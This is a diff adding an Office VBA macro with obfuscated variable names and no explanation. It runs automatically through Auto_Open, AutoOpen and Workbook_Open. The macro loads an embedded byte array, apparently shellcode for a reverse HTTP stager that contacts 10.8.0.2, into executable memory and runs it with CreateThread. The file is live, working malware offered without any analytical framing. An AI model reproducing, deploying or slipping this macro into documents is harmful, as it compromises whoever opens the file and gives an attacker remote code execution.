@@ -1,0 +1,66 @@
+#If Vba7 Then
+	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Liyh As Long, ByVal Denduc As Long, ByVal Diuq As LongPtr, Ctvuz As Long, ByVal Dpjfqnx As Long, Fuylcle As Long) As LongPtr
+	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Aiyodai As Long, ByVal Rfqxbh As Long, ByVal Qxzqwvxx As Long, ByVal Tmpfxly As Long) As LongPtr
+	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Ihhog As LongPtr, ByRef Kyxaq As Any, ByVal Tdl As Long) As LongPtr
+#Else
+	Private Declare Function CreateThread Lib "kernel32" (ByVal Liyh As Long, ByVal Denduc As Long, ByVal Diuq As Long, Ctvuz As Long, ByVal Dpjfqnx As Long, Fuylcle As Long) As Long
+	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Aiyodai As Long, ByVal Rfqxbh As Long, ByVal Qxzqwvxx As Long, ByVal Tmpfxly As Long) As Long
+	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Ihhog As Long, ByRef Kyxaq As Any, ByVal Tdl As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+	Dim Gsp As Long, Rxyrdp As Variant, Vjhnc As Long
+#If Vba7 Then
+	Dim  Nyuknnl As LongPtr, Euffung As LongPtr
+#Else
+	Dim  Nyuknnl As Long, Euffung As Long
+#EndIf
+	Rxyrdp = Array(72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101, _
+72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74, _
+74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1, _
+193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24, _
+11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72, _
+1,208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139, _
+52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56, _
+224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
+208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208, _
+65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255, _
+224,88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190, _
+119,105,110,105,110,101,116,0,65,86,72,137,225,73,199,194,76,119,38,7, _
+255,213,83,83,72,137,225,83,90,77,49,192,77,49,201,83,83,73,186,58, _
+86,121,167,0,0,0,0,255,213,232,9,0,0,0,49,48,46,56,46,48, _
+46,50,0,90,72,137,193,73,199,192,187,1,0,0,77,49,201,83,83,106, _
+3,83,73,186,87,137,159,198,0,0,0,0,255,213,232,137,0,0,0,47, _
+120,114,117,86,85,108,65,107,50,104,87,90,98,53,104,116,122,106,55,112, _
+48,103,121,69,116,108,95,110,119,110,111,74,56,80,65,69,78,88,116,98, _
+67,111,73,122,86,45,53,90,74,66,117,119,117,109,56,97,122,107,74,107, _
+115,50,99,121,88,103,65,111,82,116,100,88,82,119,90,80,97,79,73,45, _
+118,121,97,114,73,73,84,49,121,117,90,100,88,45,75,68,80,90,120,117, _
+86,116,76,99,51,107,53,48,113,78,74,117,120,79,65,119,54,65,57,85, _
+65,110,66,103,85,117,54,113,51,112,70,70,50,111,97,0,72,137,193,83, _
+90,65,88,77,49,201,83,72,184,0,50,160,132,0,0,0,0,80,83,83, _
+73,199,194,235,85,46,59,255,213,72,137,198,106,10,95,72,137,241,106,31, _
+90,82,104,128,51,0,0,73,137,224,106,4,65,89,73,186,117,70,158,134, _
+0,0,0,0,255,213,72,137,241,83,90,77,49,192,77,49,201,83,83,73, _
+199,194,45,6,24,123,255,213,133,192,117,12,72,255,207,116,2,235,192,232, _
+86,0,0,0,83,89,106,64,90,73,137,209,193,226,16,73,199,192,0,16, _
+0,0,73,186,88,164,83,229,0,0,0,0,255,213,72,147,83,83,72,137, _
+231,72,137,241,72,137,218,73,199,192,0,32,0,0,73,137,249,73,186,18, _
+150,137,226,0,0,0,0,255,213,72,131,196,32,133,192,116,178,102,139,7, _
+72,1,195,133,192,117,210,88,88,195,88,106,0,89,73,199,194,240,181,162, _
+86,255,213)
+
+	Nyuknnl = VirtualAlloc(0, UBound(Rxyrdp), &H1000, &H40)
+	For Vjhnc = LBound(Rxyrdp) To UBound(Rxyrdp)
+		Gsp = Rxyrdp(Vjhnc)
+		Euffung = RtlMoveMemory(Nyuknnl + Vjhnc, Gsp, 1)
+	Next Vjhnc
+	Euffung = CreateThread(0, 0, Nyuknnl, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+	Auto_Open
+End Sub
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+
